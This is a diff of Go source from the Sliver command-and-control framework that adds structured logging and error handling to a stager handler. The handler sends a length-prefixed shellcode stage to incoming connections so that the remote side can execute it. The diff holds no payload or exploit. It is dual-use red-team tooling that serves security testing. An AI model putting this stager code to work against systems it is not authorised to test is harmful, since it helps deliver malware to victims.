@@ -23,6 +23,8 @@ import (
 	"net"
 	"strings"
 
+	"github.com/sirupsen/logrus"
+
 	"github.com/bishopfox/sliver/server/log"
 )
 
@@ -33,7 +35,10 @@ var (
 // ServeStagerConnections - Given a listener, accept and handle incoming connections that are requesting
 // a stage payload. This function is strictly the same than ServeListenerConnections, except that we
 // just write the payload to the connection and exit.
-func ServeStagerConnections(ln net.Listener, payload []byte) {
+func ServeStagerConnections(log *logrus.Entry, ln net.Listener, payload []byte) {
+
+	// Setup the logger
+	log = log.WithField("component", "handler")
 
 	// The C2 root listen function might not have passed any listener,
 	// because the protocol doesn't use one, like HTTP or DNS
@@ -44,7 +49,7 @@ func ServeStagerConnections(ln net.Listener, payload []byte) {
 	for {
 		conn, err := ln.Accept()
 		if err != nil {
-			mtlsLog.Errorf("Accept failed: %v", err)
+			log.Debugf("Accept failed: %v", err)
 			if errType, ok := err.(*net.OpError); ok && errType.Op == "accept" {
 				break
 			}
@@ -62,28 +67,32 @@ func ServeStagerConnections(ln net.Listener, payload []byte) {
 		// For some reason when closing the listener
 		// from the Comm system returns a nil connection...
 		if conn == nil {
-			mtlsLog.Errorf("Accepted a nil conn: %v", err)
+			log.Debugf("Accepted a nil conn: %v", err)
 			break
 		}
 
 		// Set up the RPC layer around the connection
-		go handleStagerConnection(conn, payload)
+		go handleStagerConnection(log, conn, payload)
 
 	}
 }
 
 // handleStagerConnection - Writes a stage payload to a connection, for execution on the remote side.
-func handleStagerConnection(conn net.Conn, data []byte) {
-	mtlsLog.Infof("Accepted incoming connection: %s", conn.RemoteAddr())
+func handleStagerConnection(log *logrus.Entry, conn net.Conn, data []byte) {
 	// Send shellcode size
 	dataSize := uint32(len(data))
 	lenBuf := make([]byte, 4)
 	binary.LittleEndian.PutUint32(lenBuf, dataSize)
-	tcpLog.Infof("Shellcode size: %d\n", dataSize)
+	log.Infof("Shellcode size: %d", dataSize)
 	final := append(lenBuf, data...)
-	tcpLog.Infof("Sending shellcode (%d)\n", len(final))
+	log.Infof("Sending shellcode (%d)", len(final))
 	// Send shellcode
-	conn.Write(final)
+	n, err := conn.Write(final)
+	if err != nil {
+		log.Errorf("Writing stage to connection failed: %s", err)
+	} else {
+		log.Debugf("Successfully written (%d bytes) to connection", n)
+	}
 	// Closing connection
 	// conn.Close()
 }
